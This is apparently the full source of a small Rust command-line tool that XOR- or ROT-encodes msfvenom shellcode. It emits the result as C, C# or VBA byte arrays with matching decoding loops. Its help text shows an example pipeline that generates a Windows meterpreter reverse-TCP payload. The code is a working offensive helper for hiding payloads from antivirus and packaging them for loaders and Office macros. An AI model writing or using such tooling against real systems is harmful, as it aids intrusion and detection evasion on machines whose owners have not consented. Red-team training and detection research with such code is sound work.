use clap::{Parser, ValueEnum};
use itertools::Itertools;
use std::io::{self, BufRead};

/// CLI utility to encode msfvenom generated shellcode
#[derive(Parser, Debug, Clone)]
#[command(author, version, about, long_about = None, after_help = "Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f hex | shellcode-encoder -f csharp -e xor -k 17")]
struct Args {
    /// Shellcode output format
    #[clap(value_enum)]
    #[arg(short, long)]
    format: Format,

    /// Encoder to use
    #[clap(value_enum)]
    #[arg(short, long)]
    encoder: Encoder,

    /// Key for the encoding format (decimal)
    #[arg(short, long)]
    key: u8,

    /// Print decoding routine
    #[arg(short, long, default_value_t = true)]
    decoding_routine: bool
}

#[derive(ValueEnum, Debug, Clone)]
enum Format {
    C,
    Csharp,
    Vbapplication,
}

#[derive(ValueEnum, Debug, Clone)]
enum Encoder {
    Xor,
    Rot,
}

fn encode_xor(v: Vec<u8>, key: u8) -> Vec<u8> {
    v.iter().map(|x| x ^ key).collect()
}

#[test]
fn test_encode_xor() {
    assert_eq!(vec![0x00, 0x11], encode_xor(vec![0xaa, 0xbb], 0xaa));
}

fn encode_rot(v: Vec<u8>, key: u8) -> Vec<u8> {
    v.iter().map(|x| x.wrapping_add(key)).collect()
}

#[test]
fn test_encode_rot() {
    assert_eq!(vec![0xab, 0x00], encode_rot(vec![0xaa, 0xff], 0x01));
}

fn gen_c_output(v: Vec<u8>) -> String {
    let mut ret = String::new();

    let lines = v
        .iter()
        .map(|x| format!("\\x{:02x?}", x))
        .chunks(14)
        .into_iter()
        .map(|mut chunk| chunk.join(""))
        .collect::<Vec<_>>();

    ret.push_str("unsigned char buf[] = \n\"");
    ret.push_str(&lines.iter().join("\"\n\""));
    ret.push_str("\";");

    ret
}

fn gen_csharp_output(v: Vec<u8>) -> String {
    let shellcode_len = v.len();
    let mut ret = String::new();

    let mapped = v.iter().map(|x| format!("0x{:02x?}", x));

    let first_line = mapped
        .clone()
        .take(6)
        .join(",");
    
    let lines = mapped
        .skip(6)
        .chunks(12)
        .into_iter()
        .map(|mut chunk| chunk.join(","))
        .collect::<Vec<_>>();

    if lines.len() > 0 {
        ret.push_str(&format!("byte[] buf = new byte[{shellcode_len}] {{{first_line},\n"));
        ret.push_str(&lines.iter().join(",\n"));
        ret.push_str("};");
    } else {
        ret.push_str(&format!("byte[] buf = new byte[{shellcode_len}] {{{first_line}}};"));
    }

    ret
}

fn gen_vbapplication_output(v: Vec<u8>) -> String {
    let mut ret = String::new();

    let lines = v
        .iter()
        .map(|x| format!("{}", x))
        .chunks(83)
        .into_iter()
        .map(|mut chunk| chunk.join(","))
        .collect::<Vec<_>>();

    ret.push_str("Dim buf As Variant\n");
    ret.push_str("buf = Array(");
    ret.push_str(&lines.iter().join(", _\n"));
    ret.push_str(")");

    ret
}

fn get_decoding_c_xor(key: u8) -> String {
    format!(
r"for (int i = 0; i < (sizeof buf - 1); i++) {{
    buf[i] = buf[i] ^ {key};
}}")
}

fn get_decoding_c_rot(key: u8) -> String {
    format!(
r"for (int i = 0; i < (sizeof buf - 1); i++) {{
    buf[i] = (buf[i] - {key}) & 0xff;
}}")
}

fn get_decoding_csharp_xor(key: u8) -> String {
    format!(
r"for (int i = 0; i < buf.Length; i++) {{
    buf[i] = (byte)(buf[i] ^ {key});
}}")
}

fn get_decoding_csharp_rot(key: u8) -> String {
    format!(
r"for (int i = 0; i < buf.Length; i++) {{
    buf[i] = (byte)((buf[i] - {key}) & 0xff);
}}")
}

fn get_decoding_vbapplication_xor(key: u8) -> String {
    format!(
r"For i = 0 To UBound(buf)
    buf(i) = buf(i) Xor {key}
Next i")
}

fn get_decoding_vbapplication_rot(key: u8) -> String {
    format!(
r"For i = 0 To UBound(buf)
    buf(i) = buf(i) - {key}
Next i")
}

fn main() {
    let args = Args::parse();

    let chunks = io::stdin()
        .lock()
        .lines()
        .map_while(|x| x.ok())
        .map(|line| {
            line.chars()
                .chunks(2)
                .into_iter()
                .map(|chunk| u8::from_str_radix(&chunk.collect::<String>(), 16))
                .collect::<Result<Vec<_>, _>>()
        })
        .collect::<Vec<_>>();

    for chunk in chunks {
        if let Ok(chunk) = chunk {
            let encoded = match args.encoder {
                Encoder::Xor => encode_xor(chunk, args.key),
                Encoder::Rot => encode_rot(chunk, args.key),
            };
            let output = match args.format {
                Format::C => gen_c_output(encoded),
                Format::Csharp => gen_csharp_output(encoded),
                Format::Vbapplication => gen_vbapplication_output(encoded),
            };
            println!("{}", output);

            if args.decoding_routine {
                eprintln!();
                eprintln!("{}", match (&args.format, &args.encoder) {
                    (&Format::C, &Encoder::Xor) => get_decoding_c_xor(args.key),
                    (&Format::C, &Encoder::Rot) => get_decoding_c_rot(args.key),
                    (&Format::Csharp, &Encoder::Xor) => get_decoding_csharp_xor(args.key),
                    (&Format::Csharp, &Encoder::Rot) => get_decoding_csharp_rot(args.key),
                    (&Format::Vbapplication, &Encoder::Xor) => get_decoding_vbapplication_xor(args.key),
                    (&Format::Vbapplication, &Encoder::Rot) => get_decoding_vbapplication_rot(args.key),
                });
            }
        } else {
            eprintln!("Invalid input");
            continue;
        }
    }
}
